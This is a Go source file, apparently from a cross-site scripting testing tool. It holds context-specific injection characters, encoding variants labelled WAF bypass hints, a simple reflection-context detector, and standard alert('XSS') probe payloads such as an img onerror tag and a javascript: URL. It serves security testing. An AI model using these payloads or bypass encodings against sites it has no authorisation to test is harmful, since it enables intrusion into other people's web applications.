package utils

import (
	"math/rand"
	"strings"
)

// MagicCharacters contains special characters for manual XSS testing
var MagicCharacters = []string{
	"'", "\"", "<", ">", "&", ";", "(", ")", "{", "}", "[", "]",
	"`", "~", "!", "@", "#", "$", "%", "^", "*", "+", "=",
	"|", "\\", "/", "?", ":", ",", ".", " ", "\t", "\n", "\r",
}

// ContextSpecificMagic contains magic characters for specific contexts
var ContextSpecificMagic = map[string][]string{
	"html": {"<", ">", "'", "\"", "&"},
	"js":   {"'", "\"", ";", "{", "}", "(", ")", "`"},
	"css":  {"{", "}", ";", ":", "/*", "*/", "'", "\""},
	"url":  {"&", "=", "?", "#", "%", "+", " "},
	"json": {"{", "}", "[", "]", ":", ",", "\""},
	"xml":  {"<", ">", "&", "'", "\""},
	"sql":  {"'", "\"", ";", "--", "/*", "*/", "(", ")"},
}

// GenerateMagicCharacter generates a magic character based on context
func GenerateMagicCharacter(context string) string {
	if chars, exists := ContextSpecificMagic[strings.ToLower(context)]; exists {
		return chars[rand.Intn(len(chars))]
	}

	return MagicCharacters[rand.Intn(len(MagicCharacters))]
}

// GenerateMagicString generates a string with multiple magic characters
func GenerateMagicString(context string, length int) string {
	var result strings.Builder

	for i := 0; i < length; i++ {
		result.WriteString(GenerateMagicCharacter(context))
	}

	return result.String()
}

// GetBypassHints returns WAF bypass hints for specific characters
func GetBypassHints(char string) []string {
	bypassMap := map[string][]string{
		"<":  {"&lt;", "\\u003c", "\\x3c", "%3c", "\\074"},
		">":  {"&gt;", "\\u003e", "\\x3e", "%3e", "\\076"},
		"'":  {"&apos;", "\\u0027", "\\x27", "%27", "\\047"},
		"\"": {"&quot;", "\\u0022", "\\x22", "%22", "\\042"},
		"&":  {"&amp;", "\\u0026", "\\x26", "%26", "\\046"},
		"(":  {"\\u0028", "\\x28", "%28", "\\050"},
		")":  {"\\u0029", "\\x29", "%29", "\\051"},
		";":  {"\\u003b", "\\x3b", "%3b", "\\073"},
		" ":  {"%20", "+", "\\u0020", "\\x20"},
	}

	if hints, exists := bypassMap[char]; exists {
		return hints
	}

	return []string{}
}

// DetectContext attempts to detect the context where a parameter appears
func DetectContext(response string, param string, value string) string {
	// Simple context detection based on surrounding characters
	if strings.Contains(response, "<script") && strings.Contains(response, value) {
		return "js"
	}
	if strings.Contains(response, "<style") && strings.Contains(response, value) {
		return "css"
	}
	if strings.Contains(response, "<"+value) || strings.Contains(response, value+">") {
		return "html"
	}
	if strings.Contains(response, "{\""+param+"\":") {
		return "json"
	}
	if strings.Contains(response, "<?xml") {
		return "xml"
	}

	return "html" // Default context
}

// GenerateTestPayload creates a test payload with magic characters
func GenerateTestPayload(context string) string {
	switch strings.ToLower(context) {
	case "js":
		return "';alert('XSS');//"
	case "css":
		return "};alert('XSS');//"
	case "html":
		return "<img src=x onerror=alert('XSS')>"
	case "url":
		return "javascript:alert('XSS')"
	case "json":
		return "\",\"xss\":\"<img src=x onerror=alert('XSS')>\",\""
	default:
		return "<script>alert('XSS')</script>"
	}
}
